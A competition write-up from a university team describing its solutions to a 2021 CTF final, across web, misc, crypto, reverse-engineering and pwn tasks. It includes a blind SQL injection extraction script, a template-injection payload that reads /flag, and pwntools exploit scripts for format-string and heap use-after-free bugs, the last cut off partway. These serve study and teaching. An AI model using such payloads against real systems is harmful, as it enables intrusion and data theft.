---
title: Belt and Road and BRICS Finals 2021 Writeups
translation_id: brics-finals-2021
source_digest: 8369accfe2a8dc4ead43587f76df90135c513c814614843fae1d14c44ed4bc47
tags:
  - Web
  - Misc
  - Crypto
  - Reverse
  - Pwn
categories:
  - Cybersecurity
  - CTF
sections: {"web3-unsolved": "web3未解出", "reference-link": "参考链接"}
---

On 8 June, our team, China University of Mining and Technology Team 02, represented the university in the Enterprise Information Systems Security final of the 2021 Belt and Road and BRICS competition. We placed first in the CTF with 1700 out of 2000 points.

During the competition we solved every Crypto, RE and Pwn task. Afterwards we wrote up our approaches and revisited the few challenges we hadn’t finished.

## Web

The web tasks mostly covered familiar material. What made them difficult was working out what the author intended: there were login forms everywhere and hardly any hints.

### web1

http://101.133.134.12:8001/

![image-20220620125508509](https://res.cloudinary.com/sycamore/image/upload/v1792696586/Typora/2022/06/7cc93168358cebd281d36f75a99776e0.png)

All I could do on the page was pop balloons. Finishing the game sent no request, so I checked the JavaScript and found the PHP file that held the flag.

![image-20220620125456098](https://res.cloudinary.com/sycamore/image/upload/v1792696587/Typora/2022/06/16f5828c9e0cfdae068d122fef90351c.png)

![image-20220620223446550](https://res.cloudinary.com/sycamore/image/upload/v1792696584/Typora/2022/06/a428fdb8fa9752169a008288a92d1b8b.png)

Opening flag.php redirected me to a 404. Watching the traffic in the browser’s Network tab was enough.

![image-20220620223614556](https://res.cloudinary.com/sycamore/image/upload/v1792696586/Typora/2022/06/3ad71e6932bcc48f3adcdf7778e35ca0.png)

flag:88E3773E766EE1FFD98F3FEBE7D876DB

### web2

http://101.133.134.12:8002/

![image-20220620090837625](https://res.cloudinary.com/sycamore/image/upload/v1792696588/Typora/2022/06/6188997a808503d88da1f67d3c493704.png)

This was SQL injection with filters on spaces, for, union, commas, asterisks and other tokens. The main difficulty was listing tables: information_schema was unavailable, so I needed an alternative.

I put together a time-based blind SQL injection query.

```sql
1'^(select(sleep(1))from(mysql.user)where((select({columns})from({table})where({limit}))<'xxx'))^'
```

Then I wrote a script to recover the password.

```python
import requests

import requests
import time

def getDatabase(flag=""):  # 获取数据库名
    global baseurl,sql
    flag=""
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            print(mid,chr(mid))
            usesql="1'^(select(sleep(1))from(mysql.user)where(%s))^'"%sql.\
                    replace("flag",flag+chr(mid))
            # print(usesql)
            start_time=time.time()
            res = requests.post(
                baseurl +"login.php",
                data={"uname":usesql,
                  "passwd":"1"
                }
            )
            use_time=time.time()-start_time
            # print(use_time)
            if use_time > 1:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        flag += chr(mid - 1)
        print(i,"flag is -> " + flag)

columns="group_concat(passwd)"
# 从sys.schema_index_statistics得到表名
table="testx.admin"
limit="'U'<'z'"

sql=f"(select({columns})from({table})where({limit}))<'flag'"

baseurl="http://101.133.134.12:8002/"
getDatabase("")

#f9b46e5b6dc40d49fef9c5f287d177ad
```

That gave me the password’s MD5 digest. [Looking it up](https://www.somd5.com/) returned 5555666.

I logged in as admin with the password 5555666.

That returned the flag.

`flag{AD7008D8BB2DFB6AD521F99A1FF08B54}`


### web3 (unsolved)

http://101.133.134.12:8003/

This one felt like a riddle. I spent ages getting nowhere. After the competition other players said it was SQL again. Two SQL challenges? That really hadn’t occurred to me.

![image-20220620221731113](https://res.cloudinary.com/sycamore/image/upload/v1792696590/Typora/2022/06/39f4ca5dcdc6510260cb32462e4fc610.png)

### web4

http://101.133.134.12:8004/

![image-20220620221821224](https://res.cloudinary.com/sycamore/image/upload/v1792696591/Typora/2022/06/2cbdf0994890977a091df5ca11120743.png)

A scan turned up the source backup index.php.bak:

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
$key='flag{xxx}';
if (isset($_GET['name']) and isset($_GET['pwd'])) {
    if ($_GET['name'] == $_GET['pwd']){
        echo '<p>姓名与密码不能一致!</p>';
       }elseif(is_numeric($_GET['pwd'])){
	die('密码不能是纯数字');
       }elseif (md5($_GET['name']) == md5($_GET['pwd'])){
      die($key);}
    else{
        echo '<p>无效密码</p>';}
}
else{
  echo '<p>首次登陆!</p>';
}
?>
```

The username and password had to differ, neither could be purely numeric, and their MD5 results had to match.

It was the classic MD5 check. A collision was one option; another was to pass arrays so the hash calls failed and returned the same false value in this environment.

I went with the array method and got the flag.

?name[]=1&pwd[]=1

Here’s the flag:

FDA095FC516DA9AE2A15AB135BFF8C80

### web5

http://101.133.134.12:8005/

![image-20220620221148060](https://res.cloudinary.com/sycamore/image/upload/v1792696592/Typora/2022/06/45b7a99411b7284e79ecc93b545cba46.png)

The dashboard identified itself as using the tabib framework. I couldn’t find a relevant vulnerability online or anything useful by clicking around. Uploading files and creating records didn’t even send requests. The calendar did return an unusual message:

![image-20220620211231533](https://res.cloudinary.com/sycamore/image/upload/v1792696592/Typora/2022/06/dfcdddcfc40379b8f4ed863db11fc3bd.png)

I suspected the calendar, but couldn’t see the bug. A scan found a console route leading to a Flask backend. Calculating the PIN didn’t pan out. Eventually I found server-side template injection in the calendar and used that to read /flag.

I retrieved the built-in open function, opened /flag and read its contents.

```
{ {''.__class__.__mro__[-1].__subclasses__()[64].__init__.__globals__.__builtins__.open('/flag','r').read() } }
```

Another way to write it:

```
http://101.133.134.12:8005/{{''[request.values.c][request.values.m][-1][request.values.s]()[64][request.values.i][request.values.g][request.values.b][request.values.o](request.values.file,'r')[request.values.r]() }}&c=__class__&m=__mro__&s=__subclasses__&i=__init__&g=__globals__&b=__builtins__&o=open&r=read&file=/flag
```

### web6

http://101.133.134.12:8006/

![image-20220620222553452](https://res.cloudinary.com/sycamore/image/upload/v1792696594/Typora/2022/06/86078170c086e4be0e3c19618dfdbd0f.png)

![image-20220620222805556](https://res.cloudinary.com/sycamore/image/upload/v1792696595/Typora/2022/06/40d9dc8e7b8a4958999cf8472e8e3a44.png)

![image-20220620222758667](https://res.cloudinary.com/sycamore/image/upload/v1792696596/Typora/2022/06/e667aae1d40eb237c602fe151a73a56c.png)



Another riddle. I didn’t solve this one during the match. Afterwards someone in chat said they’d brute-forced it. I’d considered that too, but I’d just deleted my old wordlist. With password and hash set to the values corresponding to admin@123, the response disclosed gettf1ag.php; opening that file returned the flag.


## Misc

### misc1
The file had a .bat extension, but 010 Editor showed recognisable PowerPoint identifiers. After I renamed it to .ppt, WPS opened it and asked for a password.

![image-20220620014555010](https://res.cloudinary.com/sycamore/image/upload/v1792696596/Typora/2022/06/8a2cd7f40020deec0fb07a490c84beb6.png)

While inspecting the file in Notepad I spotted a hint: the password was four decimal digits. These were the scripts used to generate and test the candidate list:
```python
# 字典生成
import itertools as its
words = "1234568790"
r =its.product(words,repeat=4)
dic = open("pass1.txt","a")
for i in r:
    dic.write("".join(i))
    dic.write("".join("\n"))
dic.close()
```
```python
# 爆破
import os
import sys
import win32com.client
import pywintypes
passw=[]
dic = open("pass1.txt","r")
data=dic.readline().strip('\n');
while data:
    passw.append(data);
    data=dic.readline().strip('\n');
dic.close();
wps1=win32com.client.Dispatch('Kwps.application')
wps1.Visible=True
wps1.DisplayAlerts = 0
for i in passw:
    try:
        d=wps1.Documents.Open(r'C:\Users\Sycamore\Desktop\CTF\flag去哪了.ppt',PasswordDocument=i);
    except pywintypes.com_error:
        print(i)
        continue
    print("succcccceesss"+i)
    break;
```

### misc2
I separated the embedded files with binwalk and inspected them one by one. One file, 3BD12, contained Base64 text.

![image-20220620014548136](https://res.cloudinary.com/sycamore/image/upload/v1792696598/Typora/2022/06/768eee297663a9e32fc4fc496cac6f97.png)

Decoding it twice gave the flag.

### misc3
Listening to the recording, I thought it sounded like SSTV. There were quite a few SSTV challenges that year. I decoded it with Robot36 on Android and got this image:
![image-20220620014542237](https://res.cloudinary.com/sycamore/image/upload/v1792696599/Typora/2022/06/f51ed89d71155cbcda0bfc8f6e732d98.png)

### misc4
At the end of the file, 010 Editor showed the hint `lsb`.
![image-20220620014535850](https://res.cloudinary.com/sycamore/image/upload/v1792696599/Typora/2022/06/a0b423aba3dce71da97e7ff584b46211.png)

In StegSolve, bit plane zero looked unusual in all three colour channels.
Extracting those bits produced this JFIF image:
![image-20220620014529631](https://res.cloudinary.com/sycamore/image/upload/v1792696599/Typora/2022/06/1f50a00f8fc8a07fc7bab3299c06a3cd.png)

I opened the new image in 010 Editor and found a Base64 string in the middle of the file. It decoded to the flag.
![image-20220620014522816](https://res.cloudinary.com/sycamore/image/upload/v1792696602/Typora/2022/06/6a15b005d94435c94b76898f2f6b43c5.png)

## CRYPTO
### Crypto1

The alphabet and padding suggested a Base encoding.

The first Base64 decode gave `K5WTCNDBIZXXUZCHGFHWC22VO5LVO4CDMFCTCNSVKRHGCUSHJV5FI22SJNQUM4CIKJKFET2SGFVXUV2WMRHGKVTMLBJVIQSOMFVVK6CUGBTXOUCRHU6Q====`. Four padding characters ruled out Base64, which allows at most two. The uppercase alphabet suggested Base32. After that came two more layers of Base64.

![image-20220620110331959](https://res.cloudinary.com/sycamore/image/upload/v1792696603/Typora/2022/06/cdefdc67d556d6eab98241c52fffe5c3.png)

```python
import base64
c='SzVXVENOREJJWlhYVVpDSEdGSFdDMjJWTzVMVk80Q0RNRkNUQ05TVktSSEdDVVNISlY1RkkyMlNKTlFVTTRDSUtKS0ZFVDJTR0ZWWFVWMldNUkhHS1ZUTUxCSlZJUVNPTUZWVks2Q1VHQlRYT1VDUkhVNlE9PT09'
print(base64.b64decode(c))
c1='K5WTCNDBIZXXUZCHGFHWC22VO5LVO4CDMFCTCNSVKRHGCUSHJV5FI22SJNQUM4CIKJKFET2SGFVXUV2WMRHGKVTMLBJVIQSOMFVVK6CUGBTXOUCRHU6Q===='
print(base64.b32decode(c1))
c2='Wm14aFozdG1OakUwWWpCaE16UTNaRGMzTkRKaFpHRTROR1kzWVdNeVlXSTBNakUxT0gwPQ=='
print(base64.b64decode(c2))
c3='ZmxhZ3tmNjE0YjBhMzQ3ZDc3NDJhZGE4NGY3YWMyYWI0MjE1OH0='
print(base64.b64decode(c3))
#flag{f614b0a347d7742ada84f7ac2ab42158}
```

### Crypto2

The hint pointed to a Caesar cipher, but the text included punctuation such as +, ( and ?. Neither the usual 26 shifts nor working backwards from `flag{` or `Zmxh` (Base64 for “fla”) revealed a pattern.

I tried shifts from 0 to 127 and printed the candidates with readable characters.

```python
s=b'Nd(+X=fqZqEEM<bpKegNYMg?NdkEDcAkKLIaEL(LHdcFM\'c*Nc[QEMchP*gFM=c-NM^n'

for i in range(128):
    m=[]
    for j in range(len(s)):
        m.append((s[j]-i)%128)
    print('shfit: %d'%i,bytes(m).decode())

```

Here’s what the script printed:

![image-20220620110941375](https://res.cloudinary.com/sycamore/image/upload/v1792696604/Typora/2022/06/95583e673986ca8fb15a052c62d8b6d8.png)

At a shift of 119, one candidate looked like Base64. I tried decoding it.

![image-20220620111119812](https://res.cloudinary.com/sycamore/image/upload/v1792696605/Typora/2022/06/c1f50a879e27e33a64a8e8f5b722b870.png)

Two rounds of decoding gave the flag. Here’s the full script:

```python
import base64

s=b'Nd(+X=fqZqEEM<bpKegNYMg?NdkEDcAkKLIaEL(LHdcFM\'c*Nc[QEMchP*gFM=c-NM^n'
"""
for i in range(128):
    m=[]
    for j in range(len(s)):
        m.append((s[j]-i)%128)
    print('shfit: %d'%i,bytes(m).decode())
"""
print(base64.b64decode('Wm14aFozczNNVEkyTnpWbVpHWmtNMlJtTURjNU1UQmlOV0l3WldZNVlqY3pOVFl6WVgw'))
print(base64.b64decode('ZmxhZ3s3MTI2NzVmZGZkM2RmMDc5MTBiNWIwZWY5YjczNTYzYX0='))
m='flag{712675fdfd3df07910b5b0ef9b73563a}'
```

### Crypto3

The RSA challenge supplied c, n and e. The exponent was small and even, suggesting it shared a factor with φ(n). I tried factoring n with YAFU.

It took a while, but YAFU found the factors:

![image-20220620111541593](https://res.cloudinary.com/sycamore/image/upload/v1792696608/Typora/2022/06/11e61701c1ca00d8a3f8593f77dadbf6.png)

With p and q I could calculate φ(n). Since gcd(e, φ(n)) = 4, e had no inverse modulo φ(n). I rewrote the power as (m⁴)^(e/4) and inverted e/4 instead. Raising c to that inverse gave m⁴ modulo n. For this message an integer fourth root worked directly, and converting the result to bytes revealed the flag.

```python
import gmpy2
from Crypto.Util.number import *
n = 22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311
e = 180
c = 17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559
p=149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527
q=149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993
phi=(p-1)*(q-1)
e=e//gmpy2.gcd(e,phi)
d=gmpy2.invert(e,phi)
m4=pow(c,d,n)
print(long_to_bytes(gmpy2.iroot(m4,4)[0]))
#flag{09dfc77eaebb50f136fc184533b9d556}
```

### Crypto4

The attachment contained a custom implementation of ADFGVX. It supplied the square key, `ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8`, but left the transposition keyword unknown.

```python
def getKeyword(x):
    key = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in range(x)])
    for i in key:
        if key.count(i)!=1: #只有一种
            return getKeyword(x)
    return key
keyword = getKeyword(7)
```

The generator chose seven different letters. That left 26 × 25 × 24 × 23 × 22 × 21 × 20 = 3,315,312,000 possible keywords, too many to try during the competition. I went back to how ADFGVX works.

I looked up the encryption steps and found this diagram:

![image-20220620114533949](https://res.cloudinary.com/sycamore/image/upload/v1792696607/Typora/2022/06/015954e81f3f5c183a376d48e8cebdf3.png)

The diagram shows the 5 × 5 ADFGX square. ADFGVX extends it to 6 × 6. After substituting coordinate pairs, the cipher transposes them according to the keyword.

With that in mind, I went back to the script.

```python
    def encipher_char(self, ch, size=6, chars='ADFGVX'):
        row = (int)(self.key.index(ch)/size) #第几行
        col = (self.key.index(ch) % size)    #第几列
        return chars[row] + chars[col]  #行列替换
```

Printing the square gave:

```python
k='ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8'
for i in range(0,len(k),6):
    for j in range(6):
        print(k[i+j].upper(),end=' ')
    print()

"""
   A D F G V X 
A  P H 0 Q G 6 
D  4 M E A 1 Y 
F  L 2 N O F D 
G  X K R 3 C V 
V  S 5 Z W 7 B 
X  J 9 U T I 8 
"""
```

Direct substitution gave the wrong result. Looking at the implementation again, I found how it rearranged the columns.

```python
step1 = self.encipher_string(string) #简单置换后的结果
step2 = self.encipher_sortind(step1)

def sortind(word): #返回key字母在排序后的字母中的位置
    t1 = [(word[i], i) for i in range(len(word))]
    t2 = [(k[1], i) for i, k in enumerate(sorted(t1))]
    return [q[1] for q in sorted(t2)]

def encipher_sortind(self,string):
     string = self.remove_punctuation(string)
     ret = ''
     ind = self.sortind(self.keyword)
     for i in range(len(self.keyword)):
          ret += string[ind.index(i)::len(self.keyword)] #取出某一列拼出来
     return ret
```

You can check that ordering by hand.

![image-20220620125424031](https://res.cloudinary.com/sycamore/image/upload/v1792696608/Typora/2022/06/2dcc4036c7d355c33b91d57185d4293f.png)

Seven columns have only 7! = 5,040 possible orders. I tried each one and rejected any recovered keyword containing a digit or a repeated letter. Here’s the decoder:

```python
from pycipher import ADFGVX
from itertools import permutations

def decipher_pair(pair, key='ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8', size=6, chars='ADFGVX'): #反求key
    row = chars.index(pair[0])
    col = chars.index(pair[1])
    return key[row * size + col]
def decipher_str(string):
    ret = ''
    for i in range(0, len(string), 2):
        ret += decipher_pair(string[i:i + 2])
    return ret

def check(s): #优化爆破 即解密的key要在小写字母表内 且 无数字
    num_lst = ['AF', 'AX', 'DA', 'DV', 'FD', 'GG', 'VD', 'VV', 'XD', 'XX'] #剔除数字
    all = []
    for i in range(7):
        t = s[i * 2] + s[i * 2 + 1]
        if (t in num_lst):
            return False
        if (t in all):
            return False
        all.append(t)
    return True

kenc = 'XAGDFGVGXXXGAX'
flag = 'DXVGGVGGVGVFXAFVFXFFXFVFFFVFDVVGADGVAVGDAAVXGDGXGXDFVFDAVADAXAAFFVFXXGVX'

r1 = [kenc[i] for i in range(0, len(kenc), 2)] #明文中第一行
r2 = [kenc[i] for i in range(1, len(kenc), 2)] #明文中第二行

all_list = list(permutations([0, 1, 2, 3, 4, 5, 6], 7)) #暴力枚举所有状态

for it in all_list:
    c = [r1[i] for i in it] + [r2[i] for i in it] #连续两个为r1和r2行中的元素 且置换回去
    d = ''.join(c)

    if check(c):
        kd = decipher_str(d)
        enc = ADFGVX('ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8', kd)
        ed = enc.encipher(kd)
        if ed == kenc:
            print(kd,it)
            print(enc.decipher(flag).lower())
#flag{fb0dd5203c02cf7c60dc99330b5bfa66}
```
ADFGVX reference link: https://blog.csdn.net/euzen/article/details/119085350


## RE
### RE1

![image-20220620101847626](https://res.cloudinary.com/sycamore/image/upload/v1792696609/Typora/2022/06/7c2d39d2c6227afa277042cf00152b28.png)

This Go binary compared the input directly with the flag. I could read it in the main function or find it in IDA’s strings window (Shift+F12).

`flag{02f4fd5497119e238350002c5dbe1341}`

### RE2

Shift+F12 opened the strings window. A cross-reference from a flag-related string led me to the check function.

![image-20220620102221703](https://res.cloudinary.com/sycamore/image/upload/v1792696618/Typora/2022/06/9b5fe8265403314329b3c674044bb68b.png)

The binary had been stripped. String references helped me recognise library calls such as printf. I also tried IDA’s Lumina service, though it recovered little here.

![image-20220620102354592](https://res.cloudinary.com/sycamore/image/upload/v1792696613/Typora/2022/06/da8d38b07b5e7cf03c41a567f48d5153.png)

The decompiled loop looked like it might XOR the input. To see what it actually did, I stepped through it with `flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}`.

![image-20220620103006635](https://res.cloudinary.com/sycamore/image/upload/v1792696614/Typora/2022/06/8f3cf2b4c05deabfe371be3385cfd607.png)

At first v5 pointed near the input. Stepping forward showed v9 pointing to its beginning and v10 to its end.

![image-20220620103326614](https://res.cloudinary.com/sycamore/image/upload/v1792696617/Typora/2022/06/909ed8188b35431bcc1e4bb5116a0d4a.png)

The loop XORed each character with 7. The result appeared to live in the second pointer of a structure at v6. The program compared it with the ciphertext in the structure at &unk_7FF6EFEE78D0.

![image-20220620103527434](https://res.cloudinary.com/sycamore/image/upload/v1792696619/Typora/2022/06/65edca9055c4a728e1d318e7368d47f7.png)

The second pointer in that structure pointed to the ciphertext.

![image-20220620103552293](https://res.cloudinary.com/sycamore/image/upload/v1792696622/Typora/2022/06/a0381cbf6ff1dc1230b451116c3934e0.png)

I extracted the bytes and XORed them with 7 to recover the flag.

```python
s=[0x61, 0x6B, 0x66, 0x60, 0x7C, 0x31, 0x3F, 0x37, 0x37, 0x65, 0x35, 0x66, 0x31, 0x3F, 0x36, 0x64, 0x3E, 0x3E, 0x62, 0x65, 0x33, 0x36, 0x30, 0x3F, 0x37, 0x65, 0x30, 0x65, 0x35, 0x3E, 0x33, 0x66, 0x64, 0x32, 0x36, 0x34, 0x3E, 0x7A]
for i in range(len(s)):
    s[i]^=7
print(bytes(s))
#flag{6800b2a681c99eb41780b7b294ac5139}
```

### RE3

I opened the binary in IDA and followed main.

![image-20220620104456550](https://res.cloudinary.com/sycamore/image/upload/v1792696622/Typora/2022/06/7f7e210fc34a6bc3fcfb1bb2d1cd4b34.png)

The program read 32 characters into a buffer. Every path reached LABEL_5, where it parsed each pair of characters as a hexadecimal byte in v21. Shifting the byte count right by three gave the number of eight-byte blocks.

![image-20220620105103276](https://res.cloudinary.com/sycamore/image/upload/v1792696622/Typora/2022/06/995c29f2976872b6b957bee05684239a.png)

The block operation looked like a modified TEA round. Here’s how I reconstructed it:

In 32-bit arithmetic, subtracting 0x61c88647 is equivalent to adding 0x100000000 − 0x61c88647, or 0x9e3779b9.

```c
void Tea_Encrypt(ut32* src, ut32* k) {
	ut32 sum = 0;
	ut32 v0 = src[0];
	ut32 v1 = src[1];
	for (int i = 0; i < 0x20; i++) {
		sum += 0x9e3779b9;
		v0 += ((v1 << 3) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
		v1 += ((v0 << 3) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
	}
	src[0] = v0;
	src[1] = v1;
}
```

This version shifted v1 and v0 left by three. With that change and the key `{18, 52, 86, 120}`, I wrote the inverse:

```c
#include<iostream>
#define ut32 unsigned int
#define delta 0x9E3779B9
void Tea_Decrypt(ut32* enc, ut32* k) {
	ut32 sum = delta * 0x20;
	ut32 v0 = enc[0];
	ut32 v1 = enc[1];
	for (int i = 0; i < 0x20; i++) {
		v1 -= ((v0 << 3) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
		v0 -= ((v1 << 3) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
		sum -= delta;
	}
	enc[0] = v0;
	enc[1] = v1;
}

int main() {
	ut32 m[4] = { 0x6278CC2F,0x65FE5089 ,0x2B581C7C,0x4E60BA90 };
	ut32 k[4] = { 18,52,86,120 };

	for (int i = 0; i < 4; i += 2) {
		Tea_Decrypt(m+i, k);
	}
	for (int i = 0; i < 16; i++) {
		printf("%02x", *((unsigned char*)m + i));
	}
	//flag{35f0be164cf02aa7c59ca09de5d7bb78}
	return 0;
}
```
## PWN
### pmagic

These were the two format-string vulnerabilities:

![image-20220620113001740](https://res.cloudinary.com/sycamore/image/upload/v1792696622/Typora/2022/06/a60c1fa88d00bafbe95816ea1a206fbd.png)

First run:

1. Use the format string to leak the libc base.
2. Overwrite printf’s GOT entry with system and set _fini_array to 0x400640 to run the challenge again. A shorter alternative here is to replace the exit hook with a one_gadget.

Second run:

1. The input was limited to five characters, so I used `cat *` to read the flag.

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pmagic')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
p = process('./pmagic')
# debug()
p = remote('101.133.134.12',10000)

sea('Give me your name.\n','%15$p')

libc_leak = int(rc(14),16)
libc_base = libc_leak - 0x5f1718
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()
og = '''
❯ one_gadget libc-2.23.so -l2
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcd0f3 execve("/bin/sh", rcx, r12)
constraints:
  [rcx] == NULL || rcx == NULL
  [r12] == NULL || r12 == NULL

0xcd1c8 execve("/bin/sh", rax, r12)
constraints:
  [rax] == NULL || rax == NULL
  [r12] == NULL || r12 == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf02b0 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
'''
ones = [libc_base + int(i,16) for i in re.findall(r'\n(.+?) execve',og)]
# sl((fmtstr_payload(8,{(elf.got['printf']):system_addr,(0x600A78):0x400640})).ljust(0x100,'\0'))
sea('Say something.\n',(fmtstr_payload(8,{(elf.got['printf']):system_addr,(0x600A78):0x400640})).ljust(0x100,'\0'))
# flag{9cc94030040c64f2122706df577d15ee}
p.interactive()
```


![image-20220620114145159](https://res.cloudinary.com/sycamore/image/upload/v1792696626/Typora/2022/06/d26beea959cbaa17cbecb1d5b70d5514.png)

### orw_h2

A classic libc 2.31 menu-driven heap challenge.

Freeing a chunk left the pointer intact: a straightforward **use-after-free**.

![image-20220620113201143](https://res.cloudinary.com/sycamore/image/upload/v1792696626/Typora/2022/06/57e330134d62778bbe29225751d63f8d.png)

My approach:

1. Set up the heap and use pointers left in the large bin to leak the libc and heap bases.
2. Use tcache poisoning to allocate over __free_hook and write the address of the gadget `rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call QWORD PTR [rdx+0x20]` there.
3. Combine the gadget with setcontext for a stack pivot, mark the chunk readable, writable and executable, then read and execute shellcode to get the flag. If you know the exact flag filename and path, an ORW chain works too.

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./orw_h2')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
# p = process('./orw_h2')
# debug()
p = remote('101.133.134.12',10001)

def menu(choice):
    sla('>> ',str(choice))

def add(size,data='u'):
    menu(1)
    sla('Length of game description:',str(size))
    sea('Game description:',str(data))

def dele(id):
    menu(2)
    sla('game index: ',str(id))

def edit(id,data):
    menu(3)
    sla('game index: ',str(id))
    sea('Edit Game description:',str(data))

def show(id):
    menu(4)
    sla('game index: ',str(id))

add(0x420) # 0
add(0x20) # 1
dele(0)
show(0)
libc_leak = uu64(ru('\n')[-6:])
libc_base = libc_leak - 0x1ecbe0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()
magic = libc_base + 0x1518b0 # mov    rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]
rdi = libc_base + 0x0000000000023b72
rsi = libc_base + 0x000000000002604f
rdx_r12 = libc_base + 0x0000000000119241
ret = libc_base + 0x0000000000022679
rax = libc_base + 0x0000000000047400
jmp_rsi = libc_base + 0x000000000010d60d
read_addr = libc.sym.read
'''
0x0000000000047400 : pop rax ; ret
0x0000000000023b72 : pop rdi ; ret
0x0000000000119241 : pop rdx ; pop r12 ; ret
0x000000000015f7e6 : pop rdx ; pop rbx ; ret
0x00000000001025ad : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000024920 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000023b70 : pop rsi ; pop r15 ; ret
0x000000000002604f : pop rsi ; ret
0x0000000000133fe6 : pop rsi ; ret 0xb
0x000000000002491c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
